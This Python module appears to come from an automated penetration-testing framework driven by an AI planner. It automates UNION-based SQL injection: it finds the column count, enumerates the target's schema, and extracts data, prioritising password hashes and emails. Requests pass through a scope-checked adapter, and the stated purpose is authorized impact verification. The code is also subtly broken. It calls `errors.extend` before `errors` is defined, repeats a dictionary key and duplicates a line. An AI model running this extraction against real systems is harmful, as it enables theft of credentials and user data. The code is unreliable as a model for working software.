"""UNION extraction as one deterministic capability.

Measured defect this closes: the planner chose "UNION-based extraction" from its
escalation menu, guessed the column count (9 against a 10-column query), and the server's
column-count error was the only feedback it got. It never learned the number that worked,
so the escalation produced a 500 and no impact was ever demonstrated.

The column count and a working extraction are both mechanically derivable from the
server's own responses, so this belongs in code, not in a model guess. The model still
decides *whether* to escalate and *which* class to extract; this tool decides *how*, and
records every request so the result is auditable.
"""
import re
from urllib.parse import urlsplit, urlunsplit, parse_qsl

from src.adaptix.evidence.verification import BASIS_CATEGORIES

MAX_REQUESTS = 40

# Expressions are NOT declared here. Naming `Users.email` in this file made the
# capability work against exactly one deployment: the column count was measured while the
# table and column names were assumed, so any other target reported "no impact" for the
# wrong reason. `enumerate_schema()` asks the database's own catalogue through the same
# string slot, and `extraction_targets()` ranks what it found by credential class. A
# version string is the only fallback, because it names no table.



# Which finding classes can carry a SQL injection an extraction could escalate.
_INJECTION_CLASSES = frozenset({'sql_injection', 'nosql_injection', 'command_injection',
                                'template_injection', 'ldap_injection'})
_INJECTION_TITLE = re.compile(r'(?i)\bsql\b|inject')

# Where a proven injection can land. Measured: with the baseline sweep disabled, the
# probe's evidence arrives in `findings` (with `finding_type`/`path_key`/`parameter`)
# while `injection_findings` stays empty - so reading one bucket made the extraction
# report "no verified injection names a target" on a run that had just proved one.
_INJECTION_BUCKETS = ('injection_findings', 'findings', 'verified_findings',
                      'scanner_matched_findings')


def _finding_class(finding):
    """The vulnerability class, including probe buckets that only record a basis.

    A probe writes ``verification_basis='differential_injection'`` and no
    ``finding_type``/``class``. The report and live view already derive the class
    from that basis; the escalation path must do the same or it rejects a verified
    injection it was just handed.
    """
    kind = str(finding.get('finding_type') or finding.get('class')
               or finding.get('category') or '')
    if kind:
        return kind.lower()
    basis = str(finding.get('verification_basis') or '')
    if not basis:
        proof = finding.get('verification_evidence')
        if isinstance(proof, dict):
            basis = str(proof.get('verification_basis') or '')
    return str(BASIS_CATEGORIES.get(basis) or '').lower()

def _injection_record(finding):
    """Target, parameter and payload from any bucket's own field names."""
    kind = _finding_class(finding)
    title = str(finding.get('title') or '')
    if not (kind in _INJECTION_CLASSES or _INJECTION_TITLE.search(kind + ' ' + title)):
        return None
    candidates = [str(finding.get(key) or '') for key in ('path_key', 'target', 'url')]
    candidates = [value for value in candidates if value]
    if not candidates:
        return None
    parameter = str(finding.get('parameter') or '')
    source = candidates[0]
    if not parameter:
        # The parameter is frequently only present as the query string, and `path_key`
        # is the cleaned path - so fall through to the URL that actually carries it. The
        # endpoint must come from that same URL: pairing one endpoint with another
        # endpoint's parameter sends the payload somewhere the injection was never proven.
        for candidate in candidates:
            name = next((name for name, _value in parse_qsl(urlsplit(candidate).query)), '')
            if name:
                parameter, source = name, candidate
                break
    if not parameter:
        return None
    parsed = urlsplit(source)
    base = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, '', '')) or source
    payload = str(finding.get('payload') or '')
    if not payload:
        reproduction = finding.get('reproduction')
        if isinstance(reproduction, dict):
            payload = str(reproduction.get('payload') or '')
    return base, parameter, payload


def _target_and_parameter(state):
    """The endpoint and parameter the verified injection already names.

    Read every bucket that can hold one: the class of a finding is the same fact
    whichever pipeline stage wrote it down.
    """
    for bucket in _INJECTION_BUCKETS:
        for finding in (state.get(bucket) or []):
            if not isinstance(finding, dict):
                continue
            record = _injection_record(finding)
            if record:
                return record
    return '', '', ''


def _as_int(value, default=0):
    """Coerce a state value to int.

    Measured defect: `int(state.get('raw_bytes', 0))` raises TypeError when the key exists
    with an explicit None, and the caller's `except` reported only the exception type, so
    the tool "failed: TypeError" with no location. Coerce at one place instead.
    """
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def union_extract(state):
    """Discover the UNION column count, extract data, and record a verdict.

    Called after an injection is verified. Returns the same shape other tools return:
    state additions plus an `action_outcomes`-friendly record, so the planner sees the
    result through the normal observation pipeline rather than a special case.
    """
    from src.adaptix.evidence.union_extract import probe_and_confirm
    from src.adaptix.tools.web import http_request

    target, parameter, prior_payload = _target_and_parameter(state)
    if not target or not parameter:
        return {'errors': list(state.get('errors', [])) + [
            'union_extract: no verified injection finding names a target and parameter'],
            'execution_metrics': state.get('execution_metrics', {}),
            'raw_bytes': state.get('raw_bytes', 0)}

    budget = _as_int(state.get('tool_call_budget'))
    used = _as_int((state.get('execution_metrics') or {}).get('tool_calls_used'))
    if budget and budget - used < 8:
        return {'errors': list(state.get('errors', [])) + [
            'union_extract: too little tool budget left for column discovery and extraction'],
            'execution_metrics': state.get('execution_metrics', {}),
            'raw_bytes': state.get('raw_bytes', 0)}

    requests = []
    errors_seen = []
    raw = _as_int(state.get('raw_bytes'))
    run_id = str(state.get('run_id') or 'union-extract')
    # The adapter validates scope on every call; keep the authorization context fixed so a
    # discovery loop cannot drift out of scope between attempts.
    STATE_BASE = {key: state.get(key) for key in (
        'target', 'status', 'authorization', 'grant', 'scope_manifest', 'scope_networks',
        'scope_aliases', 'scope_ports', 'hosts', 'tool_call_budget', 'errors', 'events',
        'probe_traces', 'execution_metrics')}
    STATE_BASE['raw_bytes'] = 0
    # A state key present with an explicit None is not an empty accumulator. Handing None
    # into the adapter made `list(None)` raise inside http_request, which surfaced as
    # "Tool failed: TypeError" three times in a live run before it was traced.
    for key in ('errors', 'events', 'probe_traces', 'request_audit'):
        if STATE_BASE.get(key) is None:
            STATE_BASE[key] = []

    def fetch(url):
        """Route every request through the scope-pinned, rate-limited adapter.

        Each call is a fresh request, so the raw-byte delta is accumulated here rather
        than threaded through the state: passing a growing `raw_bytes` into the adapter
        made it report a negative delta and the request was refused.
        """
        nonlocal raw
        requests.append(url)
        result = http_request({**STATE_BASE, 'run_id': run_id, 'planned_actions': [
            {'tool': 'http_request', 'target': url, 'reason': 'union_extract discovery'}]})
        trace = (result.get('probe_traces') or [{}])[-1]
        raw += _as_int(result.get('raw_bytes'))
        body = trace.get('body_excerpt') or ''
        status = _as_int(trace.get('status_code'))
        if not status and (result.get('errors') or []):            
            errors_seen.append(str(result['errors'][-1]))
        return status, body

    base = target.split('?')[0]
    baseline_url = '%s?%s=%s' % (base, parameter, 'adaptix_control')
    baseline_status, baseline_text = fetch(baseline_url)

    from src.adaptix.evidence.union_extract import (discover_columns, enumerate_schema,
                                                  extraction_targets)

    # Column discovery is the expensive part (one request per candidate count). Measure it
    # once and reuse the answer: re-deriving it per expression spent 10 of 18 requests on
    # work that had already succeeded.
    discovery = discover_columns(fetch, target, parameter, prior_payload)

    # Ask the target what it stores before extracting anything from it. Without a schema
    # the old code extracted from a literal table name and silently produced no impact on
    # every other application.
    schema = {'dialect': None, 'tables': {}, 'attempts': []}
    if discovery.get('columns'):
        schema = enumerate_schema(fetch, target, parameter, discovery, prior_payload)
    targets = extraction_targets(schema)

    results = []
    for expression, table, label in targets:
        if len(requests) >= MAX_REQUESTS:
            break
        outcome = probe_and_confirm(fetch, target, parameter, prior_payload=prior_payload,
                                    expression=expression, table=table,
                                    baseline_text=baseline_text, discovery=discovery)
        extraction = outcome.get('extraction') or {}
        extraction = outcome.get('extraction') or {}
        results.append({'label': label, 'expression': expression, 'table': table,
                        'columns': (outcome.get('discovery') or discovery).get('columns'),
                        'url': extraction.get('url'),
                        'payload': extraction.get('payload'),
                        'status': extraction.get('status'),
                        'rows': extraction.get('rows'),
                        'values': extraction.get('values') or [],
                        'value_count': extraction.get('value_count', 0),
                        'executed': bool(extraction.get('executed'))})
        # Stop once a credential class is proven: the version string and a bare email are
        # weaker impact than the password hash that makes the leak actionable.
        if extraction.get('executed') and label in ('password_hash', 'user_email'):
            if label == 'password_hash' or sum(r['executed'] for r in results) >= 2:
                break

    proven = [row for row in results if row['executed']]
    columns = next((row['columns'] for row in results if row['columns']), None)

    if errors_seen:
        errors.extend('union_extract adapter: ' + message for message in errors_seen[:3])
    record = {
        'adapter_errors': errors_seen[:3],
        'target': base, 'parameter': parameter, 'columns': columns,
        'schema_dialect': schema.get('dialect'),
        'schema_tables': {name: len(cols) for name, cols in (schema.get('tables') or {}).items()},
        'schema_attempts': schema.get('attempts') or [],
        'extraction_targets': [{'expression': e, 'table': t, 'label': l} for e, t, l in targets],
        'attempts': results, 'requests': len(requests),
        'impact_proven': bool(proven),
        'leaked_classes': [row['label'] for row in proven],
        'sample_values': [row['values'][0] for row in proven if row['values']][:3],
    }

    findings = list(state.get('injection_findings') or [])
    # The bucket a probe writes to is an implementation detail; what makes a record a
    # finding is `verification_status`. A measured run proved a password hash here and the
    # report still showed one row, because `collect_findings` reads `verified_findings`
    # and this tool only wrote `injection_findings` - proof that never reached the
    # deliverable. Write the same record to the bucket the report actually reads.
    verified = list(state.get('verified_findings') or [])
    # Evidence identity is (target, parameter, payload): calling the tool again on the same
    # injection re-proves the same fact. A live run appended four identical findings and
    # the planner saw them as four separate results, so append only when the identity is new.
    identity = (base, parameter, proven[0]['payload'] if proven else None)
    def _same(row):
        return (str(row.get('target') or '').split('?')[0], row.get('parameter'),
                row.get('payload')) == identity
    already = any(_same(row) for row in findings) or any(_same(row) for row in verified)
    if proven and not already:
        proof_url = proven[0].get('url') or base
        record_entry = {
            'class': 'sql_injection',
            'target': base,
            'url': proof_url,
            'parameter': parameter,
            'payload': proven[0]['payload'],
            'reproduction': {'method': 'GET', 'url': proof_url, 'parameter': parameter,
                             'payload': proven[0]['payload']},
            'impact': 'union_data_extraction',
            'extracted_classes': record['leaked_classes'],
            'extracted_sample': record['sample_values'],
            'rows_returned': proven[0]['rows'],
            'columns': columns,
            'verification_basis': 'union_extraction_executed',
            'verification_status': 'verified',
            'severity': 'critical',
            'source_tool': 'union_extract',
            'impact_proven': True,
            'evidence_basis': 'union_extraction_executed',
            'extracted_sample': record['sample_values'][:1],
        }
        findings.append(record_entry)
        verified.append(dict(record_entry))

    errors = list(state.get('errors', []))
    if not proven:
        errors.append('union_extract: column count %s discovered but no extraction executed'
                      % columns if columns else 'union_extract: column count not discovered')

    metrics = dict(state.get('execution_metrics') or {})
    metrics['tool_calls_used'] = _as_int(metrics.get('tool_calls_used')) + len(requests)
    metrics['union_extract_requests'] = len(requests)

    return {
        'injection_findings': findings,
        'verified_findings': verified,
        'union_extract': record,
        'execution_metrics': metrics,
        'raw_bytes': raw,
        'errors': errors,
        'events': list(state.get('events', [])) + [
            'union_extract: %s columns, %d requests, impact=%s'
            % (columns, len(requests), record['impact_proven'])],
    }
